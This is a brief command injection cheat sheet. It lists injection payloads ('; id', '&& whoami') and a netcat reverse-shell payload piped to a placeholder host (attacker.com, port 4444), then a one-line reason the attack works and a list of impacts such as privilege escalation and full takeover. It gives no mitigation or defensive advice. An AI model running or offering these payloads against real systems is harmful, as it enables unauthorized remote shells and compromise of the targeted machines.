# Command Injection Cheat Sheet

## Payloads
; id
&& whoami
| nc attacker.com 4444 -e /bin/bash

## Why it works
User input is executed by OS without sanitization.

## Impact
- Reverse shells
- Privilege escalation
- Full takeover
